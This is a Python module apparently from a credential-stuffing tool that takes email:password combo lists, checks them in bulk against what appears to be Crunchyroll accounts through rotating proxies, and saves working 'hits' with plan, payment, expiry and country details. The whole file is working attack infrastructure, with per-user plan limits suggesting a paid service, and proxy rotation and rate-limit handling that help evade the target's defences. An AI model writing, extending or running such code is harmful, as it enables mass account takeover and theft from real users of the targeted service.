import time
import asyncio
import logging
import uuid
import tracemalloc
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional

import config
from core import checker, proxy as proxy_mod
import db.database as db

log = logging.getLogger(__name__)


# ═══════════════════════════════════════════
# JOB CONTEXT
# ═══════════════════════════════════════════
@dataclass
class JobContext:
    """Holds all mutable state for a running job."""
    job_id: str
    user_id: int
    total: int
    status: str = "running"  # running | completed | cancelled | failed
    checked: int = 0
    hits: int = 0
    free: int = 0
    bad: int = 0
    retry: int = 0
    proxy_errors: int = 0
    start_time: float = 0.0
    speed: float = 0.0
    hit_results: list[dict[str, Any]] = field(default_factory=list)
    free_results: list[str] = field(default_factory=list)
    bad_results: list[str] = field(default_factory=list)
    cancel_event: asyncio.Event = field(default_factory=asyncio.Event)
    # File paths
    out_dir: Optional[Path] = None
    hit_file: Optional[Path] = None
    free_file: Optional[Path] = None
    bad_file: Optional[Path] = None
    # Concurrency
    max_concurrent: int = config.MAX_CONCURRENT
    semaphore: Optional[asyncio.Semaphore] = None
    progress_msg_id: Optional[int] = None
    last_progress_edit: float = 0.0

    def __post_init__(self):
        self.start_time = time.monotonic()
        self.semaphore = asyncio.Semaphore(self.max_concurrent)

    def elapsed(self) -> float:
        return time.monotonic() - self.start_time

    def cpm(self) -> float:
        elapsed = self.elapsed()
        if elapsed < 1:
            return 0.0
        return (self.checked / elapsed) * 60

    def cps(self) -> float:
        elapsed = self.elapsed()
        if elapsed < 1:
            return 0.0
        return self.checked / elapsed

    def eta(self) -> str:
        if self.checked == 0:
            return "--:--"
        remaining = self.total - self.checked
        rate = self.cps()
        if rate < 0.1:
            return ">99:59"
        secs = int(remaining / rate)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        if h:
            return f"{h}h {m}m {s}s"
        return f"{m}m {s}s"


# ═══════════════════════════════════════════
# GLOBAL JOB REGISTRY
# ═══════════════════════════════════════════
_active_jobs: dict[str, JobContext] = {}
_job_lock = asyncio.Lock()


async def get_active_job(user_id: int) -> Optional[JobContext]:
    async with _job_lock:
        for ctx in _active_jobs.values():
            if ctx.user_id == user_id and ctx.status == "running":
                return ctx
    return None


async def get_job_ctx(job_id: str) -> Optional[JobContext]:
    return _active_jobs.get(job_id)


async def register_job(ctx: JobContext) -> None:
    async with _job_lock:
        _active_jobs[ctx.job_id] = ctx


async def unregister_job(job_id: str) -> None:
    async with _job_lock:
        _active_jobs.pop(job_id, None)


async def active_job_count() -> int:
    async with _job_lock:
        return sum(1 for j in _active_jobs.values() if j.status == "running")


# ═══════════════════════════════════════════
# COMBO PARSING
# ═══════════════════════════════════════════
def parse_combos(text: str) -> list[tuple[str, str]]:
    """Parse email:pass combos from text. Returns list of (email, pass)."""
    combos = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            continue
        idx = line.index(":")
        email = line[:idx].strip()
        password = line[idx + 1:].strip()
        if not email or not password:
            continue
        key = email.lower()
        if key in seen:
            continue
        seen.add(key)
        combos.append((email, password))
    return combos


# ═══════════════════════════════════════════
# RESULT FILE WRITING (streaming)
# ═══════════════════════════════════════════
async def open_result_files(ctx: JobContext) -> None:
    import aiofiles
    ctx.out_dir = config.TMP_DIR / ctx.job_id
    ctx.out_dir.mkdir(parents=True, exist_ok=True)
    ctx.hit_file = ctx.out_dir / "hits.txt"
    ctx.free_file = ctx.out_dir / "free.txt"
    ctx.bad_file = ctx.out_dir / "bad.txt"
    # Create empty files
    for f in (ctx.hit_file, ctx.free_file, ctx.bad_file):
        async with aiofiles.open(f, "w", encoding="utf-8") as _:
            pass


async def append_result(file_path: Path, line: str) -> None:
    import aiofiles
    try:
        async with aiofiles.open(file_path, "a", encoding="utf-8") as f:
            await f.write(line + "\n")
    except Exception as exc:
        log.warning("Failed to append result: %s", exc)


# ═══════════════════════════════════════════
# SINGLE CHECK TASK
# ═══════════════════════════════════════════
async def _process_one(
    combo: tuple[str, str],
    ctx: JobContext,
    proxy_mgr: Optional[proxy_mod.ProxyManager],
    on_hit: Optional[Callable] = None,
) -> None:
    """Process a single combo and update context."""
    if ctx.cancel_event.is_set():
        return

    email, password = combo
    proxy_url = None
    if proxy_mgr and len(proxy_mgr) > 0:
        proxy_url = await proxy_mgr.get_random()

    status, detail, info = await checker.crunchy_check(
        email, password, proxy_url, ctx.semaphore
    )

    if ctx.cancel_event.is_set():
        return

    async with _job_lock:
        ctx.checked += 1

    if status == "HIT":
        async with _job_lock:
            ctx.hits += 1
            ctx.hit_results.append({"email": email, "password": password, **info})
        if ctx.hit_file:
            line = (
                f"{email}:{password} | User: {info.get('user', '?')} | "
                f"Plan: {info.get('plan', '?')} | Expires: {info.get('expires', '?')} | "
                f"Renew: {info.get('renew', '?')} | Streams: {info.get('streams', '?')} | "
                f"Country: {info.get('country', '?')} | Payment: {info.get('payment', '?')} | "
                f"Verified: {info.get('verified', '?')}"
            )
            await append_result(ctx.hit_file, line)
        if on_hit:
            await on_hit(email, password, info)

    elif status == "FREE":
        async with _job_lock:
            ctx.free += 1
        if ctx.free_file:
            await append_result(ctx.free_file, f"{email}:{password} | User: {info.get('user', '?')}")

    elif status == "BAD":
        async with _job_lock:
            ctx.bad += 1
        if ctx.bad_file:
            await append_result(ctx.bad_file, f"{email}:{password}")

    elif status == "RATE":
        async with _job_lock:
            ctx.retry += 1
        await asyncio.sleep(config.RATE_LIMIT_DELAY)

    else:  # RETRY or PROXY_ERR
        if "proxy" in detail.lower() or "socks" in detail.lower():
            async with _job_lock:
                ctx.proxy_errors += 1
            if proxy_url:
                proxy_mgr.mark_dead(proxy_url)
        else:
            async with _job_lock:
                ctx.retry += 1


# ═══════════════════════════════════════════
# BULK JOB RUNNER
# ═══════════════════════════════════════════
async def run_bulk_job(
    combos: list[tuple[str, str]],
    user_id: int,
    plan: str,
    proxy_mgr: Optional[proxy_mod.ProxyManager] = None,
    on_hit: Optional[Callable] = None,
    on_progress: Optional[Callable] = None,
) -> JobContext:
    """
    Run a bulk checking job with bounded concurrency.
    Returns the JobContext when done (or cancelled).
    """
    plan_cfg = config.PLANS.get(plan, config.PLANS["free"])
    max_allowed = plan_cfg["max_combo"]
    max_concurrent = plan_cfg["speed_limit"]

    total = min(len(combos), max_allowed)
    combos = combos[:total]

    # Create job
    job_id = await db.create_job(user_id, "bulk", total)
    ctx = JobContext(
        job_id=job_id,
        user_id=user_id,
        total=total,
        max_concurrent=max_concurrent,
    )
    await register_job(ctx)
    await open_result_files(ctx)

    await db.reset_session_stats(user_id)

    log.info(
        "Job %s started: user=%d, total=%d, concurrent=%d",
        job_id, user_id, total, max_concurrent,
    )

    try:
        tasks: list[asyncio.Task] = []
        batch_size = max_concurrent * 2  # queue 2 batches worth

        for i in range(0, total, batch_size):
            if ctx.cancel_event.is_set():
                break

            batch = combos[i : i + batch_size]
            batch_tasks = [
                asyncio.create_task(_process_one(combo, ctx, proxy_mgr, on_hit))
                for combo in batch
            ]
            tasks.extend(batch_tasks)

            # Wait for this batch to finish before queuing next
            # This provides backpressure – we don't queue ALL tasks at once
            done, _ = await asyncio.wait(
                batch_tasks, return_when=asyncio.ALL_COMPLETED
            )

            # Report progress
            if on_progress:
                await on_progress(ctx)

        # Update final stats
        ctx.status = "cancelled" if ctx.cancel_event.is_set() else "completed"

    except asyncio.CancelledError:
        ctx.status = "cancelled"
        log.info("Job %s cancelled", job_id)
    except Exception as exc:
        ctx.status = "failed"
        log.exception("Job %s failed: %s", job_id, exc)
    finally:
        # Persist final stats to DB
        await db.update_job(job_id, {
            "status": ctx.status,
            "checked": ctx.checked,
            "hits": ctx.hits,
            "free": ctx.free,
            "bad": ctx.bad,
            "retry": ctx.retry,
            "proxy_errors": ctx.proxy_errors,
            "completed_at": __import__("datetime").datetime.now(
                __import__("datetime").timezone.utc
            ).isoformat(),
        })

        # Update user stats
        await db.increment_user_stats(
            user_id,
            checked=ctx.checked,
            hits=ctx.hits,
            free=ctx.free,
            bad=ctx.bad,
            sessions=1,
            jobs=1,
        )

        await unregister_job(job_id)
        log.info(
            "Job %s finished: status=%s, checked=%d, hits=%d",
            job_id, ctx.status, ctx.checked, ctx.hits,
        )

    return ctx


# ═══════════════════════════════════════════
# CANCEL JOB
# ═══════════════════════════════════════════
async def cancel_user_job(user_id: int) -> bool:
    """Cancel the active job for a user. Returns True if found."""
    ctx = await get_active_job(user_id)
    if ctx:
        ctx.cancel_event.set()
        ctx.status = "cancelled"
        await db.update_job(ctx.job_id, {"status": "cancelled"})
        return True
    return False


# ═══════════════════════════════════════════
# CLEANUP
# ═══════════════════════════════════════════
async def cleanup_old_jobs(max_age_hours: int = 24) -> int:
    """Remove old job temp directories. Returns count cleaned."""
    import shutil
    from datetime import datetime, timezone, timedelta
    import aiofiles

    cutoff = datetime.now(timezone.utc) - timedelta(hours=max_age_hours)
    cleaned = 0

    if config.TMP_DIR.exists():
        for d in config.TMP_DIR.iterdir():
            if d.is_dir():
                try:
                    mtime = datetime.fromtimestamp(d.stat().st_mtime, tz=timezone.utc)
                    if mtime < cutoff:
                        shutil.rmtree(d, ignore_errors=True)
                        cleaned += 1
                except Exception:
                    pass

    if cleaned:
        log.info("Cleaned up %d old job directories", cleaned)
    return cleaned
